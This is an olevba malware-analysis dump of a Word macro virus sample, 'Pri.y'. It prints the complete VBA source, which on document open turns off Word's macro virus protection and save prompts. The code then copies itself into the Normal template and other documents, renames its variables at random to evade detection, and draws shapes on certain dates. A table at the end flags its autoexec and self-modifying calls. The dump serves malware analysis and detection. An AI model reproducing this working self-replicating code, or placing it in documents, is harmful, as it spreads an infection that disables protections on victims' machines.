olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.y-e330ac34a3da974ca36db68558ccfa8a0236fc5f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.y-e330ac34a3da974ca36db68558ccfa8a0236fc5f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
RH926 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
RV4160 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TG3961 = ActiveDocument.VBProject.VBComponents.Item(1)
JR4747 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TG3961 = NormalTemplate.VBProject.VBComponents.Item(1)
AI6150 = True
Call UV6573_HU7577
ActiveDocument.Saved = True
End If
If AI6150 <> True And JR4747 <> True Then GoTo UD423
If AI6150 = True Then TG3961.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RH926 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If JR4747 = True Then TG3961.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RV4160 - 3))
UD423:
If RV4160 <> 0 And RH926 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function UV6573_HU7577()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "NA5228": r1(2) = "SN1930": r1(3) = "UV666": r1(4) = "CV9190": r1(5) = "HU7577": r1(6) = "RH926"
r1(7) = "RV4160": r1(8) = "JR4747":: r1(9) = "TG3961": r1(10) = "AI6150": r1(11) = "UD423": r1(12) = "UV6573": r1(13) = "QS2631": r1(14) = "AF6643"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call HU7577(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function HU7577(AF6643, QS2631 As String)
On Error Resume Next
Dim NA5228 As Long: Dim SN1930 As Long: Dim UV666 As Long: Dim CV9190 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
NA5228 = 1: SN1930 = 1: UV666 = .CountOfLines: CV9190 = Len(.Lines(.CountOfLines, 1))
Do While .Find(QS2631, NA5228, SN1930, UV666, CV9190, True)
strline = .Lines(NA5228, 1)
strline = Left(strline, SN1930 - 1) & AF6643 & Mid(strline, CV9190)
.replaceline NA5228, strline
NA5228 = UV666 + 1: SN1930 = 1:
UV666 = .CountOfLines
CV9190 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

